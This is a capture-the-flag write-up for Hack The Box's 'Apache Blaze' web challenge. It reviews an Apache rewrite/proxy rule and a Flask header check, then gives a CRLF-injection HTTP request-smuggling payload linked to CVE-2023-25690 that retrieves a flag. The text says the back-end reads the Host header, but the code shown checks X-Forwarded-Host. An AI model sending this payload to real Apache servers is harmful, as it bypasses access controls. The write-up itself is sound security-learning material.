---
title: Apache blaze - Hack The Box
date: 2024-12-09
---

<script setup>
    import ChallengeCard from "../../../../../.vitepress/components/ChallengeCard.vue";
</script>

# Apache Blaze

![Apache Blaze - thumbnail](/ctf/hack-the-box/challenges/web/apache-blaze/thumbnail.gif){width=250px height=100px style="display: block; margin: 0 auto"}

## Challenge description

Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have
the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.

## Challenge overview

This challenge presents a web application that acts as a front-end for various arcade games. The application proxies
requests to a back-end server, which hosts the games. To access the games, users must provide the game name as a query
parameter.

![Apache Blaze - Overview](/ctf/hack-the-box/challenges/web/apache-blaze/overview.png)

## Code Review

### Apache Configuration (`httpd.conf`)

  ```apache
  RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
  ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
  ```

The `RewriteRule` directs requests matching `/api/games/(.*)` to the back-end at `http://127.0.0.1:8080/?game=$1`,
with the `[P]` flag indicating proxying. `ProxyPassReverse` adjusts response headers for the client.

### Python Application (`app.py`)

```python
elif game == 'click_topia':
   if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
       return jsonify({
           'message': f'{app.config["FLAG"]}'
       }), 200
   else:
       return jsonify({
           'message': 'This game is currently available only from dev.apacheblaze.local.'
       }), 200
```

The application checks if the `game` parameter is `'click_topia'` and if the `X-Forwarded-Host` header equals
`'dev.apacheblaze.local'`. If both conditions are met, it returns a JSON response containing the flag.

### Vulnerability Analysis

The vulnerability arises from the interaction between `mod_rewrite` and `mod_proxy` in Apache, which can lead to HTTP
request smuggling. Specifically, improper input validation allows crafted requests to manipulate headers, causing the
back-end to misinterpret the request.

## Exploitation Steps

1. **Craft Malicious Request:**

   To exploit this, send a request that injects a newline (`%0d%0a`) to split headers, effectively smuggling a second
   request:

   ```
   GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/ HTTP/1.1
   ```

   This payload manipulates the request such that the front-end server interprets it as a single request, while the
   back-end sees two separate requests.

2. **Server Interpretation:**

    - **Front-End:** Processes the request up to the injected newline, treating it as a complete request.
    - **Back-End:** Interprets the portion after the newline as a new request with the `Host` header set to
      `dev.apacheblaze.local`.

3. **Flag Retrieval:**

   The back-end application, seeing the `Host` header as `dev.apacheblaze.local` and the `game` parameter as
   `click_topia`, returns the flag in its response:

   ```json
   {
       "message": "HTB{f4k3_fl4g_f0r_t3st1ng}"
   }
   ```

With the fake flag retrieved, we can use the same technique to get the real flag on the HTB server.

<ChallengeCard
    challengeType="web"
    challengeName="ApacheBlaze"
    htbCardLink="https://www.hackthebox.com/achievement/challenge/585215/546"
/>

## References

- [HTTP Request Smuggling - PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [CVE-2023-25690 Proof of Concept](https://github.com/dhmosfunk/CVE-2023-25690-POC)
- [Apache HTTP Server Vulnerabilities](https://httpd.apache.org/security/vulnerabilities_24.html)